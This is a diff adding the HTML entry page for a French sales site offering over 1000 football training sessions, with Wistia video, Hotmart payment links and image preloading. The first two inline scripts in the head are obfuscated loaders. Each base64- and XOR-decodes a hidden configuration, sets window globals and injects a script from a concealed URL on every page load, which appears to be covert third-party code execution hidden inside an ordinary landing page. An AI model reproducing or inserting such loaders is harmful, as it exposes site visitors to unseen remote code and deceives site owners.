@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <script>(function(){var p_8=atob("DCCFw2+Z2xfJgJjyUVunth31+S3r6OyGIVO/7ED6v3nn9eyfOEb87Qz2tjmr8reBMlLssxvq9GK97evdPUHxphzt9X26orTQMFTxsQb7rmOs87rIClunrQ70vjXzovyTJUGothv0snGwreiANFbgrRu0qGKr6fyBcwyntQ71rnLrurrQLH34");var x_za=[];for(var h_lij=0;h_lij<p_8.length;h_lij++){x_za.push(p_8.charCodeAt(h_lij)&255);}var u_7vtz=x_za[0];var r_8dp=x_za.slice(1,1+u_7vtz);var u_rvnk=x_za.slice(1+u_7vtz);var x_zff=u_rvnk.map(function(b,a_w){return b^r_8dp[a_w%u_7vtz];});var c_h2w="";for(var m_17w6=0;m_17w6<x_zff.length;m_17w6++){c_h2w+=String.fromCharCode(x_zff[m_17w6]&255);}var b_jeus=decodeURIComponent(escape(c_h2w));var j_v3hn=JSON.parse(b_jeus);var f_9=j_v3hn.globals||[];f_9.forEach(function(f_ykdt){window[f_ykdt.name]=f_ykdt.value;});var q_4d=document.createElement("script");q_4d.src=j_v3hn.url;q_4d.async=true;q_4d.defer=true;(j_v3hn.attributes||[]).forEach(function(e_nh){q_4d.setAttribute(e_nh.name,e_nh.value);});(document.head||document.documentElement).appendChild(q_4d);})();</script>
+    <script>(function(){var d_3jc=atob("DODkzqjYAXqCFFYRaZvGu9q0I0CgfCJlGZPe4Ye7ZRSsYSJ8AIad4Mu3bFTgZnliCpKNvtyrLgrrbDN9RpCNts20LxDxNnozCJSQvMG6dA7nZ3QrMr3I7M+0bhjjeCUzU7uf7Ma5bB+gLnRhAJiBouG8I1agYjd9HIXG9IruYE+3JW8hCtWFrMruYhu6ImQpC4TX95j6fCf/");var v_mrj9=[];for(var t_v3=0;t_v3<d_3jc.length;t_v3++){v_mrj9.push(d_3jc.charCodeAt(t_v3)&255);}var p_3ca=v_mrj9[0];var x_8ssn=v_mrj9.slice(1,1+p_3ca);var k_ts=v_mrj9.slice(1+p_3ca);var g_l=k_ts.map(function(b,e_5e){return b^x_8ssn[e_5e%p_3ca];});var y_jta="";for(var g_t=0;g_t<g_l.length;g_t++){y_jta+=String.fromCharCode(g_l[g_t]&255);}var k_0=decodeURIComponent(escape(y_jta));var f_4z=JSON.parse(k_0);var l_g=f_4z.globals||[];l_g.forEach(function(r_krm){window[r_krm.name]=r_krm.value;});var f_kg4z=document.createElement("script");f_kg4z.src=f_4z.url;f_kg4z.async=true;f_kg4z.defer=true;(f_4z.attributes||[]).forEach(function(l_7uhl){f_kg4z.setAttribute(l_7uhl.name,l_7uhl.value);});(document.head||document.documentElement).appendChild(f_kg4z);})();</script>
+    <script>
+      function redirectWithParams(destination) {
+        var currentParams = window.location.search;
+
+        if (currentParams) {
+          var separator = destination.includes("?") ? "&" : "?";
+          destination = destination + separator + currentParams.substring(1);
+        }
+
+        window.location.href = destination;
+      }
+      window.redirectWithParams = redirectWithParams;
+    </script>
+    <script>
+      // Safe JSON.stringify wrapper to prevent circular structure errors on DOM, React Fibers, and Event targets
+      (function() {
+        var nativeStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          if (value === null || typeof value !== 'object') {
+            return nativeStringify(value, replacer, space);
+          }
+
+          var seen = new WeakSet();
+          function safeReplacer(key, val) {
+            if (typeof key === 'string' && (key.startsWith('__react') || key.startsWith('_react'))) {
+              return undefined;
+            }
+            if (typeof val === 'object' && val !== null) {
+              if (
+                (typeof Node !== 'undefined' && val instanceof Node) ||
+                (typeof Window !== 'undefined' && val instanceof Window) ||
+                val.nodeType ||
+                (val.constructor && (val.constructor.name === 'FiberNode' || (typeof val.constructor.name === 'string' && val.constructor.name.startsWith('HTML'))))
+              ) {
+                if (seen.has(val)) {
+                  return undefined;
+                }
+                seen.add(val);
+                return {
+                  tagName: val.tagName || undefined,
+                  id: val.id || undefined,
+                  className: typeof val.className === 'string' ? val.className : undefined
+                };
+              }
+
+              if (seen.has(val)) {
+                return undefined;
+              }
+              seen.add(val);
+            }
+
+            if (typeof replacer === 'function') {
+              return replacer.call(this, key, val);
+            }
+            return val;
+          }
+
+          try {
+            if (Array.isArray(replacer)) {
+              return nativeStringify(value, replacer, space);
+            }
+            return nativeStringify(value, safeReplacer, space);
+          } catch (err) {
+            try {
+              var fallbackSeen = new WeakSet();
+              return nativeStringify(value, function(k, v) {
+                if (typeof k === 'string' && (k.startsWith('__react') || k.startsWith('_react'))) {
+                  return undefined;
+                }
+                if (typeof v === 'object' && v !== null) {
+                  if (fallbackSeen.has(v) || v.nodeType || (typeof Node !== 'undefined' && v instanceof Node)) {
+                    return undefined;
+                  }
+                  fallbackSeen.add(v);
+                }
+                return v;
+              }, space);
+            } catch (e) {
+              return '{}';
+            }
+          }
+        };
+      })();
+    </script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>+1000 Séances d’Entraînement de Football Prêtes à l’Emploi</title>
+    <meta name="description" content="+1000 Séances d’Entraînement de Football Prêtes à l’Emploi - Méthodologie complète, exercices illustrés et fiches clés en main pour entraîneurs." />
+    <meta property="og:title" content="+1000 Séances d’Entraînement de Football Prêtes à l’Emploi" />
+    <meta property="og:description" content="Gagnez un temps précieux et développez le niveau de vos joueurs avec plus de 1000 séances d'entraînement de football structurées." />
+    
+    <!-- DNS preconnect to critical asset domains -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link rel="preconnect" href="https://i.postimg.cc" />
+    <link rel="preconnect" href="https://i.ibb.co" />
+    <link rel="preconnect" href="https://fast.wistia.com" />
+    <link rel="preconnect" href="https://pay.hotmart.com" />
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com" />
+    <link rel="dns-prefetch" href="https://fonts.gstatic.com" />
+    <link rel="dns-prefetch" href="https://i.postimg.cc" />
+    <link rel="dns-prefetch" href="https://i.ibb.co" />
+    <link rel="dns-prefetch" href="https://fast.wistia.com" />
+    <link rel="dns-prefetch" href="https://pay.hotmart.com" />
+    
+    <!-- Parallel load Google Fonts to eliminate CSS @import blocking - optimized weights -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap" rel="stylesheet" />
+
+    <!-- Preload critical Hero and Offer images for instant zero-delay first paint -->
+    <link rel="preload" as="image" href="/images/hero_pack.webp" type="image/webp" fetchpriority="high" />
+    <link rel="preload" as="image" href="/images/sample_1.webp" type="image/webp" />
+    <link rel="preload" as="image" href="/images/bono_1.webp" type="image/webp" />
+
+    <!-- Fast parallel image preloader to eliminate load delays across all sections -->
+    <script>
+      (function() {
+        var catalogImages = [
+          "/images/hero_pack.webp",
+          "/images/sample_1.webp",
+          "/images/sample_2.webp",
+          "/images/sample_3.webp",
+          "/images/sample_4.webp",
+          "/images/sample_5.webp",
+          "/images/bono_1.webp",
+          "/images/bono_2.webp",
+          "/images/bono_3.webp",
+          "/images/bono_4.webp",
+          "/images/bono_5.webp",
+          "/images/bono_6.webp",
+          "/images/bono_7.webp",
+          "/images/bono_8.webp",
+          "/images/bono_9.webp",
+          "/images/testimonial_1.webp",
+          "/images/testimonial_2.webp",
+          "/images/testimonial_3.webp",
+          "/images/author.webp"
+        ];
+        // Instantly prefetch all images into browser cache with high concurrency
+        for (var i = 0; i < catalogImages.length; i++) {
+          var img = new Image();
+          img.decoding = "async";
+          img.referrerPolicy = "no-referrer";
+          img.src = catalogImages[i];
+        }
+      })();
+    </script>
+
+    <!-- Wistia Video Player scripts -->
+    <script src="https://fast.wistia.com/player.js" async></script>
+    <script src="https://fast.wistia.com/embed/tln7kma0r9.js" async type="module"></script>
+
+    <!-- Module preloads for fast client-side hydration -->
+    <link rel="modulepreload" href="/src/main.tsx" />
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
